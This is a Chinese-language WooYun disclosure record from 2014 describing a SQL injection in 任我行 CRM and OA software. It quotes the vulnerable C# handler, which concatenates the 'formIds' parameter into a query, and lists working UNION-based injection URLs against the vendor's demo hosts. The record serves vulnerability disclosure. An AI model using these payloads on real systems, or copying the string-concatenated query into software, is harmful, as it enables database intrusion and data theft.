{"id": 47217, "wybug_id": "wooyun-2014-081809", "wybug_title": "任我行协同CRM、任我行协同OA、任我行协同CRM 精华版存在通用型SQL注入", "wybug_corp": "成都任我行信息技术有限公司", "wybug_author": "wefgod", "wybug_date": "2014-11-03 13:20", "wybug_open_date": "2015-02-01 13:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向公众公开  简要描述： 官网几个demo全部复现。 详细说明：  官网：http://www.wecrm.com/成都任我行信息技术有限公司存在问题的系统是：任我行协同CRM、任我行协同OA、任我行协同CRM 精华版客户案例：http://www.wecrm.com/static/consumer/   漏洞证明：  漏洞文件：Handlers/WorkFlowDesignHandler.ashx\ncase \"getformsbyids\":                {                    WorkFlowManageDAL workFlowManageDAL = new WorkFlowManageDAL();                    string text2 = context.Request[\"formIds\"];  //参数可控                    System.Data.DataTable dataTable = workFlowManageDAL.SelectFormListByIds(text2); //跟进去看                    s = WFDesigner.GetFormsByIdsToXML(dataTable);                    break;                }\n跟进SelectFormListByIds\npublic DataTable SelectFormListByIds(string ids){    DataTable result;    try    {        string commandText = \"select ID,Name from CRM_CustomHtml where ID in(\" + ids.ReplaceSqlInjectChar() + \")\";  //此处仅过滤了单引号，可以轻松注入成功（因为完全可以不用单引号）        result = this.DbInstance.ExecuteDataSet(CommandType.Text, commandText).Tables[0];    }……………………}\n直接看官方的几个demo吧：任我行协同CRM：http://show.wecrm.com/xt/Handlers/WorkFlowDesignHandler.ashx?action=getformsbyids&formIds=2) UNION ALL SELECT NULL,@@version--\n\n任我行协同CRM精华版：http://show.wecrm.com/jhb/Handlers/WorkFlowDesignHandler.ashx?action=getformsbyids&formIds=2) UNION ALL SELECT NULL,@@version--\n\n任我行协同OA：http://show.wecrm.com/oa/Handlers/WorkFlowDesignHandler.ashx?action=getformsbyids&formIds=2)--http://show.wecrm.com/oa/Handlers/WorkFlowDesignHandler.ashx?action=getformsbyids&formIds=2) UNION ALL SELECT NULL,@@version--\n\n\n\n\n\n\n\n解密密码：\n\n   修复方案：  过滤   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-11-07 14:42 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-03 14:37 |    \t\tJoker \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:6        | while(age++) {\tmake(rmb);\tif (outOf(...)\t\t \n  小心向左使来砍你。    \n     2014-11-03 14:47 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  小心任盈盈来砍你。    \n     2014-11-03 16:03 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @鬼魅羊羔 @Joker 哈哈你们二位配合的真好，我来破坏队形    \n     2015-02-01 21:32 |    \t\t大物期末不能挂 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:23        | 1.一个学渣，只求每门都不挂2.想把漏洞提...)\t\t \n  ( 支付乌云币6个可以永久查看测试代码区域,wb归曾主所有  确定支付并查看  )    \n     2015-02-01 21:33 |    \t\t大物期末不能挂 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:23        | 1.一个学渣，只求每门都不挂2.想把漏洞提...)\t\t \n  错别字。。。我错了，是层不是曾    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}